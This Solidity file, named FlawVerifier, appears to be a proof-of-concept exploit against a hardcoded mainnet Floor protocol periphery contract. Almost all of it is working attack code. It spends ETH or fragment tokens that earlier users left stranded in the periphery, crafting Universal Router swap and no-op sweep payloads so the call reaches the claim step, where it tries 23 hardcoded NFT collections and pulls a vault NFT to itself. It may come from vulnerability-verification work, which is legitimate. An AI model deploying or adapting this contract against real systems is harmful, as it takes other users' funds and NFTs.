// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721Like {
    function balanceOf(address owner) external view returns (uint256);
}

interface IERC721ReceiverLike {
    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4);
}

interface IFloorPeripheryLike {
    struct FloorClaim {
        bytes32 collectionKey;
        uint256[] tokenIds;
        uint256 maxClaimFee;
        uint256 claimCnt;
    }

    struct UniversalRouterExecute {
        bytes commands;
        bytes[] inputs;
        uint256 deadline;
    }

    function buyAndClaimVault(
        FloorClaim memory claimParams,
        UniversalRouterExecute calldata swapParam,
        uint8 transferWay,
        bytes calldata transferParam
    ) external payable;

    function UNIVERSAL_ROUTER() external view returns (address);
    function floorGetter() external view returns (address);
}

interface IFloorGetterLike {
    struct RoyaltyFeeRate {
        address recipient;
        uint16 marketlist;
        uint16 vault;
        uint16 raffle;
    }

    struct SafeboxFeeRate {
        address recipient;
        uint16 auctionOwned;
        uint16 auctionExpired;
        uint16 raffle;
        uint16 marketlist;
    }

    struct VaultFeeRate {
        address recipient;
        uint16 vaultAuction;
        uint16 redemptionBase;
    }

    struct FeeConfig {
        RoyaltyFeeRate royalty;
        SafeboxFeeRate safeboxFee;
        VaultFeeRate vaultFee;
    }

    struct CollectionInfo {
        address fragmentToken;
        uint256 freeNftLength;
        uint64 lastUpdatedBucket;
        uint64 nextKeyId;
        uint64 activeSafeBoxCnt;
        uint64 infiniteCnt;
        uint64 nextActivityId;
        uint32 lastVaultAuctionPeriodTs;
        address contractAddr;
    }

    function fragmentTokenOf(address collection) external view returns (address);
    function collectionInfo(address collection) external view returns (CollectionInfo memory info);
    function collectionFee(address collection, address token) external view returns (FeeConfig memory fee);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV3FactoryLike {
    function getPool(address tokenA, address tokenB, uint24 fee) external view returns (address pool);
}

contract FlawVerifier is IERC721ReceiverLike {
    uint8 private constant TRANSFER_WAY_NATIVE = 3;

    uint256 private constant FLOOR_TOKEN_AMOUNT = 1_000_000 ether;
    uint256 private constant ONE_NFT = FLOOR_TOKEN_AMOUNT;

    bytes1 private constant UR_V3_SWAP_EXACT_IN = 0x00;
    bytes1 private constant UR_SWEEP = 0x04;
    bytes1 private constant UR_V2_SWAP_EXACT_IN = 0x08;
    bytes1 private constant UR_WRAP_ETH = 0x0b;

    address private constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address private constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address private constant UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;

    address public constant TARGET = 0x49AD262C49C7aA708Cc2DF262eD53B64A17Dd5EE;

    address private _profitToken;
    uint256 private _profitAmount;

    address private _lastReceivedCollection;
    uint256 private _lastReceivedTokenId;

    constructor() {}

    function executeOnOpportunity() external {
        if (_profitAmount != 0 || TARGET.code.length == 0) {
            return;
        }

        // Keep the original causality:
        // 1. An earlier user left value inside the periphery after a NativeTransfer call.
        // 2. That value remains pooled at the periphery.
        // 3. A later caller triggers buyAndClaimVault again in native mode.
        // 4. _executeSwap spends the pooled ETH, or _claim spends pooled fragment tokens.
        // 5. claimRandomNFT still sends the NFT to the later caller (this contract).
        //
        // The failing version used an empty router payload, which reverts before _claim.
        // This verifier keeps the same root cause but uses a realistic public route:
        // Uniswap liquidity through the already-configured Universal Router when the
        // periphery has stranded ETH, and a harmless router no-op when only stranded
        // fragment tokens are present on the periphery.
        _probeLaterCallerClaim();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata)
        external
        override
        returns (bytes4)
    {
        _lastReceivedCollection = msg.sender;
        _lastReceivedTokenId = tokenId;
        return this.onERC721Received.selector;
    }

    function _probeLaterCallerClaim() internal {
        bool canUseStrandedEth = TARGET.balance > 0;
        address floorGetter = _safeFloorGetter();
        if (floorGetter == address(0)) {
            return;
        }

        for (uint256 i; i < _candidateCount(); ++i) {
            address collection = _candidateAt(i);
            if (collection.code.length == 0) {
                continue;
            }

            IFloorGetterLike.CollectionInfo memory info = _safeCollectionInfo(floorGetter, collection);
            if (info.fragmentToken == address(0) || info.freeNftLength == 0) {
                continue;
            }

            uint256[] memory claimCosts = _claimCostCandidates(floorGetter, collection, info.fragmentToken);
            if (claimCosts.length == 0) {
                continue;
            }

            uint256 balanceBefore = _safeNftBalance(collection, address(this));

            if (canUseStrandedEth) {
                if (_attemptViaPublicLiquidity(collection, info.fragmentToken, claimCosts, balanceBefore)) {
                    return;
                }
            }

            if (_safeErc20Balance(info.fragmentToken, TARGET) > 0) {
                if (_attemptViaStrandedFragments(collection, info.fragmentToken, claimCosts, balanceBefore)) {
                    return;
                }
            }
        }
    }

    function _attemptViaPublicLiquidity(
        address collection,
        address fragmentToken,
        uint256[] memory claimCosts,
        uint256 balanceBefore
    ) internal returns (bool) {
        address router = _safeUniversalRouter();
        uint256 amountIn = TARGET.balance;
        if (router == address(0) || amountIn == 0) {
            return false;
        }

        for (uint256 i; i < claimCosts.length; ++i) {
            uint256 claimCost = claimCosts[i];

            if (_tryV3Route(collection, fragmentToken, claimCost, balanceBefore, router, amountIn, 500)) {
                return true;
            }
            if (_tryV3Route(collection, fragmentToken, claimCost, balanceBefore, router, amountIn, 3_000)) {
                return true;
            }
            if (_tryV3Route(collection, fragmentToken, claimCost, balanceBefore, router, amountIn, 10_000)) {
                return true;
            }
            if (_tryV2Route(collection, fragmentToken, claimCost, balanceBefore, router, amountIn)) {
                return true;
            }
        }

        return false;
    }

    function _attemptViaStrandedFragments(
        address collection,
        address fragmentToken,
        uint256[] memory claimCosts,
        uint256 balanceBefore
    ) internal returns (bool) {
        IFloorPeripheryLike.UniversalRouterExecute memory noopSwap = _noopSwap();

        for (uint256 i; i < claimCosts.length; ++i) {
            uint256 claimCost = claimCosts[i];
            if (_safeErc20Balance(fragmentToken, TARGET) < claimCost) {
                continue;
            }

            if (_tryBuyThenClaim(collection, claimCost, noopSwap, balanceBefore)) {
                return true;
            }
        }

        return false;
    }

    function _tryBuyThenClaim(
        address collection,
        uint256 maxClaimFee,
        IFloorPeripheryLike.UniversalRouterExecute memory swapParam,
        uint256 balanceBefore
    ) internal returns (bool) {
        _lastReceivedCollection = address(0);
        _lastReceivedTokenId = 0;

        IFloorPeripheryLike.FloorClaim memory claim;
        claim.collectionKey = _toKey(collection);
        claim.tokenIds = new uint256[](0);
        claim.maxClaimFee = maxClaimFee;
        claim.claimCnt = 1;

        try IFloorPeripheryLike(TARGET).buyAndClaimVault(claim, swapParam, TRANSFER_WAY_NATIVE, "") {
            uint256 balanceAfter = _safeNftBalance(collection, address(this));
            if (_lastReceivedCollection != collection && balanceAfter <= balanceBefore) {
                return false;
            }

            _profitToken = collection;
            _profitAmount = ONE_NFT;
            return true;
        } catch {
            return false;
        }
    }

    function _tryV2Route(
        address collection,
        address fragmentToken,
        uint256 claimCost,
        uint256 balanceBefore,
        address router,
        uint256 amountIn
    ) internal returns (bool) {
        if (!_hasV2Pair(fragmentToken)) {
            return false;
        }

        return _tryBuyThenClaim(collection, claimCost, _v2Swap(router, fragmentToken, amountIn), balanceBefore);
    }

    function _tryV3Route(
        address collection,
        address fragmentToken,
        uint256 claimCost,
        uint256 balanceBefore,
        address router,
        uint256 amountIn,
        uint24 fee
    ) internal returns (bool) {
        if (!_hasV3Pool(fragmentToken, fee)) {
            return false;
        }

        return _tryBuyThenClaim(collection, claimCost, _v3Swap(router, fragmentToken, fee, amountIn), balanceBefore);
    }

    function _claimCostCandidates(address floorGetter, address collection, address fragmentToken)
        internal
        view
        returns (uint256[] memory costs)
    {
        uint16 baseRate = _safeRedemptionBase(floorGetter, collection, fragmentToken);
        if (baseRate == 0) {
            return new uint256[](0);
        }

        // The verified protocol constants show one redemption burns one full NFT's
        // fragment unit plus a redemption fee derived from the collection's base rate
        // and current locking-ratio bucket. We cannot read the bucket directly from the
        // provided source tree, so we probe the only public fee outcomes the contract can
        // produce for a non-quota later caller.
        costs = new uint256[](6);
        for (uint256 i; i < 6; ++i) {
            uint256 fee = (FLOOR_TOKEN_AMOUNT * baseRate * (i + 1)) / 10_000;
            costs[i] = FLOOR_TOKEN_AMOUNT + fee;
        }
    }

    function _safeUniversalRouter() internal view returns (address router) {
        try IFloorPeripheryLike(TARGET).UNIVERSAL_ROUTER() returns (address queried) {
            router = queried;
        } catch {}
    }

    function _safeFloorGetter() internal view returns (address floorGetter) {
        try IFloorPeripheryLike(TARGET).floorGetter() returns (address queried) {
            floorGetter = queried;
        } catch {}
    }

    function _safeCollectionInfo(address floorGetter, address collection)
        internal
        view
        returns (IFloorGetterLike.CollectionInfo memory info)
    {
        try IFloorGetterLike(floorGetter).collectionInfo(collection) returns (IFloorGetterLike.CollectionInfo memory queried) {
            info = queried;
        } catch {}
    }

    function _safeRedemptionBase(address floorGetter, address collection, address fragmentToken)
        internal
        view
        returns (uint16 baseRate)
    {
        try IFloorGetterLike(floorGetter).collectionFee(collection, fragmentToken) returns (IFloorGetterLike.FeeConfig memory fee) {
            baseRate = fee.vaultFee.redemptionBase;
        } catch {}
    }

    function _safeNftBalance(address collection, address owner) internal view returns (uint256 bal) {
        try IERC721Like(collection).balanceOf(owner) returns (uint256 queried) {
            bal = queried;
        } catch {}
    }

    function _safeErc20Balance(address token, address owner) internal view returns (uint256 bal) {
        try IERC20Like(token).balanceOf(owner) returns (uint256 queried) {
            bal = queried;
        } catch {}
    }

    function _hasV2Pair(address fragmentToken) internal view returns (bool) {
        try IUniswapV2FactoryLike(UNISWAP_V2_FACTORY).getPair(WETH, fragmentToken) returns (address pair) {
            return pair != address(0);
        } catch {
            return false;
        }
    }

    function _v2Swap(address router, address fragmentToken, uint256 amountIn)
        internal
        view
        returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam)
    {
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = fragmentToken;

        swapParam.commands = abi.encodePacked(UR_WRAP_ETH, UR_V2_SWAP_EXACT_IN);
        swapParam.inputs = new bytes[](2);
        swapParam.inputs[0] = abi.encode(router, amountIn);
        swapParam.inputs[1] = abi.encode(TARGET, amountIn, 0, path, false);
        swapParam.deadline = block.timestamp;
    }

    function _v3Swap(address router, address fragmentToken, uint24 fee, uint256 amountIn)
        internal
        view
        returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam)
    {
        if (!_hasV3Pool(fragmentToken, fee)) {
            return _emptySwap();
        }

        swapParam.commands = abi.encodePacked(UR_WRAP_ETH, UR_V3_SWAP_EXACT_IN);
        swapParam.inputs = new bytes[](2);
        swapParam.inputs[0] = abi.encode(router, amountIn);
        swapParam.inputs[1] = abi.encode(
            TARGET,
            amountIn,
            0,
            abi.encodePacked(WETH, fee, fragmentToken),
            false
        );
        swapParam.deadline = block.timestamp;
    }

    function _noopSwap() internal view returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam) {
        // The router rejects an empty command stream. A zero-minimum SWEEP on WETH is a
        // realistic public no-op when no stranded ETH is present: it simply transfers the
        // router's current WETH balance (zero on the expected fragment-only branch) and lets
        // execution reach _claim, where the vulnerable pooled fragment accounting occurs.
        swapParam.commands = abi.encodePacked(UR_SWEEP);
        swapParam.inputs = new bytes[](1);
        swapParam.inputs[0] = abi.encode(WETH, TARGET, 0);
        swapParam.deadline = block.timestamp;
    }

    function _emptySwap() internal view returns (IFloorPeripheryLike.UniversalRouterExecute memory swapParam) {
        swapParam.commands = hex"";
        swapParam.inputs = new bytes[](0);
        swapParam.deadline = block.timestamp;
    }

    function _hasV3Pool(address fragmentToken, uint24 fee) internal view returns (bool) {
        try IUniswapV3FactoryLike(UNISWAP_V3_FACTORY).getPool(WETH, fragmentToken, fee) returns (address pool) {
            return pool != address(0);
        } catch {
            return false;
        }
    }

    function _candidateCount() internal pure returns (uint256) {
        return 23;
    }

    function _candidateAt(uint256 index) internal pure returns (address) {
        if (index == 0) return 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
        if (index == 1) return 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
        if (index == 2) return 0xED5AF388653567Af2F388E6224dC7C4b3241C544;
        if (index == 3) return 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
        if (index == 4) return 0x8a90CAb2b38dba80c64b7734e58Ee1dB38B8992e;
        if (index == 5) return 0x23581767a106ae21c074b2276D25e5C3e136a68b;
        if (index == 6) return 0x1792F4D1FDFCc12DBB7b2D07B80a900486Ea85b5;
        if (index == 7) return 0x49cF6f5d44E70224e2E23fDcdd2C053F30aDA28B;
        if (index == 8) return 0xBd3531dA5CF5857e7CfAA92426877b022e612cf8;
        if (index == 9) return 0x524cAB2ec69124574082676e6F654a18df49A048;
        if (index == 10) return 0x5AF0d9827CAcE6E16351126a8fb1BB82fd56280e;
        if (index == 11) return 0x8821BeE2ba0dF28761AffF119D66390D594CD280;
        if (index == 12) return 0x7Bd29408f11D2bFC23c34f18275bBf23bB716Bc7;
        if (index == 13) return 0xe785E82358879F061BC3dcAC6f0444462D4b5330;
        if (index == 14) return 0x1A92f7381B9F03921564a437210bB9396471050C;
        if (index == 15) return 0x79FCDEF22feeD20eDDacbB2587640e45491b757f;
        if (index == 16) return 0x34d85c9CDeB23FA97cb08333b511ac86E1C4E258;
        if (index == 17) return 0xa3AEe8BcE55BEeA1951EF834b99f3Ac60d1ABeeB;
        if (index == 18) return 0x036721e5A769Cc48B3189EFBeA922a4B8b7Fc6b6;
        if (index == 19) return 0x59325733eb952a92e069C87F0A6168b29E80627f;
        if (index == 20) return 0x769272677faB02575E84945F03Eca517ACc544Cc;
        if (index == 21) return 0xbCe3781ae7Ca1a5e050Bd9C4c77369867eBc307e;
        return 0x364C828eE171616a39897688A831c2499aD972ec;
    }

    function _toKey(address collection) internal pure returns (bytes32) {
        return bytes32(uint256(uint160(collection)));
    }
}
